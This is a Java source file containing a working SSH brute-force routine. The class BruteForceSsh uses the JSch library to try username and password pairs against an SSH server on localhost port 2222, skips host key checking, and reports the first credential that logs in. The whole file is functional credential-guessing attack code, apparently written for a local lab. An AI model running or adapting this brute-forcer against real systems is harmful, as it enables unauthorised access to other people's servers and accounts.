package org.ops;

import com.jcraft.jsch.JSch;
import com.jcraft.jsch.Session;

public class BruteForceSsh {

    private static final String HOST = "localhost";
    private static final int PORT = 2222;

    static void tryCredential(Credential cred) {
        if (BruteForceRunner.isFound()) return;

        String user = cred.user;
        String pass = cred.password;

        try {
            JSch jsch = new JSch();
            Session session = jsch.getSession(user, HOST, PORT);
            session.setPassword(pass);

            session.setConfig("StrictHostKeyChecking", "no");
            session.connect(5000); // 5 segundos de timeout

            System.out.printf("✅ FOUND → %s:%s%n", user, pass);
            BruteForceRunner.markFound();

            session.disconnect();
        } catch (Exception e) {
            System.out.printf("❌ Failed: %s:%s → %s%n", user, pass, e.getMessage());
        }
    }
}
